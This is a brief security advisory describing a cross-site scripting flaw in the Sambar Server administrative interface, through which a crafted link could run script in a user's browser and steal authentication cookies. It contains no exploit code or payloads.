Sambar Server administrative interface does not adequately filter some HTML code thus making it prone to cross-site scripting attacks. It is possible for a remote attacker to create a malicious link containing script code which will be executed in the browser of a legitimate user. All code will be executed within the context of the Web site running Sambar Server.

This issue may be exploited to steal cookie-based authentication credentials from legitimate users of the Web site running the vulnerable software.
